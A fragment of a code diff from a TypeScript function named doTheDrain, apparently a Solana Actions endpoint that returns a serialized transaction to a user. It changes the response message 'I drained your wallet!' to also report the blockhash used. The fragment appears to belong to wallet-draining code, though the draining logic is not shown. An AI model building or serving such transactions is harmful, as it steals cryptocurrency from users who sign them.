@@ -119,7 +119,7 @@ async function doTheDrain(connection: Connection, user: PublicKey, tx: Transacti
 
   const response : ActionPostResponse = {
     transaction: serialTX,
-    message: "hahahahaha, I drained your wallet!"
+    message: "hahahahaha, I drained your wallet!\nI used "+bh+" as a blockhash"
   };
   return Response.json(response, {headers: ACTIONS_CORS_HEADERS})
 
